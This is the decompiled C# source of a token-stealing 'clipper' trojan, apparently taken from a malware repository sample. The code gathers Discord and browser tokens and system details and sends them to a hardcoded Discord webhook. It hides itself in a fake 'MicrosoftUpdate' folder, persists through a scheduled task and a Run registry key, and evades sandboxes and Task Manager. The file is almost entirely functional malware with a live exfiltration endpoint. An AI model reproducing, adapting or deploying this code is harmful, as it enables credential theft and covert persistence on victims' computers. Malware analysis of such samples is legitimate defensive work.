// Decompiled with JetBrains decompiler
// Type: Update.Program
// Assembly: clipper, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 242A9602-A994-4229-B0B4-C06434ACB202
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-b5d991bf67c08940cb29c672a23da53844f43986851cbe189bb6b21c2c0e9f41.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Update
{
  public class Program
  {
    public static List<string> goSendTokens = Stealing.AllTokens;
    public static string mutex = "sb3sUocOVn2Kp5YZtl58nbY2LaNyk1sCyN3ZJQwyk3HcsiDeQ5dVlrT6fXrQC2OZ";

    [STAThread]
    [DllImport("user32.dll")]
    private static extern bool SetForegroundWindow(IntPtr hWnd);

    private static void MonitorVSez()
    {
      while (true)
      {
        try
        {
          foreach (Process process in Process.GetProcesses())
          {
            if (process.ProcessName.ToLower() == "taskmgr" || process.ProcessName.ToLower() == "Anti-Stealer" || process.ProcessName.ToLower() == "BtcClipperDetector")
              Thread.Sleep(50000);
          }
        }
        catch
        {
        }
      }
    }

    private static void schtaskumatidar()
    {
      taskexistance("hspintsdk").ToString();

      static string taskexistance(string taskname)
      {
        string friendlyName = AppDomain.CurrentDomain.FriendlyName;
        using (Process process = Process.Start(new ProcessStartInfo()
        {
          FileName = "schtasks.exe",
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          Arguments = "/query /TN " + taskname,
          RedirectStandardOutput = true
        }))
        {
          using (StreamReader standardOutput = process.StandardOutput)
          {
            if (standardOutput.ReadToEnd().Contains(taskname))
              return "false.";
            Program.cmd("schtasks.exe /create /tn hspintsdk /tr %APPDATA%/MicrosoftUpdate/" + friendlyName + " /SC minute /mo 1");
            return "true.";
          }
        }
      }
    }

    public static void cmd(string command)
    {
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo(nameof (cmd), "/C " + command)
      };
      process.StartInfo.RedirectStandardOutput = true;
      process.StartInfo.UseShellExecute = false;
      process.StartInfo.CreateNoWindow = true;
      process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      process.Start();
    }

    private static void MonitorVSshits()
    {
      while (true)
      {
        try
        {
          if (Program.SandBox.Check())
            Environment.Exit(0);
          Thread.Sleep(500);
        }
        catch
        {
        }
      }
    }

    public static void Main()
    {
      Task.WaitAll(Stealing.DiscordApp(), Stealing.DiscordCanary(), Stealing.DiscordPTB(), Stealing.Chrome(), Stealing.ChromeBeta(), Stealing.FireFox(), Stealing.Opera(), Stealing.OperaGX(), Stealing.Edge(), Stealing.Yandex(), Stealing.Brave(), Stealing.EpicPrivacy(), Stealing.Vivaldi(), Stealing.ThreeHundredSixty(), Stealing.CocCoc());
      string str1 = string.Join(Environment.NewLine, (IEnumerable<string>) Program.goSendTokens.ToList<string>());
      new Thread(new ThreadStart(Program.MonitorVSez)).Start();
      new Thread(new ThreadStart(Program.MonitorVSshits)).Start();
      Program.AppMutex.Check();
      string friendlyName = AppDomain.CurrentDomain.FriendlyName;
      using (DcWebHooklogs dcWebHooklogs = new DcWebHooklogs())
      {
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
        {
          string str2 = managementBaseObject["Caption"].ToString();
          dcWebHooklogs.ProfilePicture = "https://jooinn.com/images/money-97.jpg";
          dcWebHooklogs.UserName = "WHITE PROGRAMS";
          dcWebHooklogs.WebHook = "https://discord.com/api/webhooks/954506980070924298/hEs6dmEyPORIcEPyVn5_K5D2iKiq-XAKRjoYFtMmi1q-leUHQ544ZjFjMJWPjurdOT47";
          dcWebHooklogs.SendMessage("```You got a new victim infected with white clipper." + Environment.NewLine + Environment.NewLine + "PC Username: " + Environment.UserName + Environment.NewLine + "IP: " + Program.GetIPAddress() + Environment.NewLine + "Country: " + Program.GetCountry() + Environment.NewLine + "City: " + Program.GetCity() + Environment.NewLine + "OS: " + str2 + Environment.NewLine + "CPU: " + Program.GetCPUName() + Environment.NewLine + "GPU: " + Program.GetGPUName() + "``````DISCORD TOKENS: " + Environment.NewLine + Environment.NewLine + str1 + "```");
        }
      }
      new Thread(new ThreadStart(Program.schtaskumatidar)).Start();
      string path = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\");
      string str3 = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Roaming\\MicrosoftUpdate\\" + friendlyName);
      if (!System.IO.File.Exists(str3))
      {
        Directory.CreateDirectory(path);
        System.IO.File.Copy(friendlyName, str3);
        System.IO.File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
        System.IO.File.SetAttributes(str3, FileAttributes.Hidden | FileAttributes.System);
      }
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Path.GetFileName(str3), (object) str3);
      new Thread((ThreadStart) (() => Program.Run())).Start();
    }

    public static void Run() => Application.Run((Form) new ClipboardNotification.NotificationForm());

    public static string GetIPAddress() => new WebClient().DownloadString("http://ifconfig.me/ip");

    public static string GetCountry() => new WebClient().DownloadString("https://ipapi.co/country_name/");

    public static string GetCity() => new WebClient().DownloadString("https://ipapi.co/city/");

    public static string GetCPUName()
    {
      try
      {
        string empty = string.Empty;
        foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get())
          empty = managementBaseObject["Name"].ToString();
        return empty;
      }
      catch
      {
        return "Error";
      }
    }

    public static string GetGPUName()
    {
      try
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            return enumerator.Current["Name"].ToString();
        }
      }
      catch
      {
      }
      return "Unknown";
    }

    public static string GetProcessorID()
    {
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get())
        empty = (string) managementBaseObject["ProcessorId"];
      return empty;
    }

    private class AppMutex
    {
      public static void Check()
      {
        bool createdNew = false;
        Mutex mutex = new Mutex(false, Program.mutex, out createdNew);
        if (createdNew)
          return;
        Environment.Exit(1);
      }
    }

    internal sealed class SandBox
    {
      [DllImport("kernel32.dll")]
      private static extern IntPtr GetModuleHandle(string lpModuleName);

      public static bool Check()
      {
        string[] strArray = new string[5]
        {
          "SbieDll.dll",
          "SxIn.dll",
          "Sf2.dll",
          "snxhk.dll",
          "cmdvrt32.dll"
        };
        foreach (string lpModuleName in strArray)
        {
          if (Program.SandBox.GetModuleHandle(lpModuleName).ToInt32() != 0)
            return true;
        }
        return false;
      }
    }
  }
}
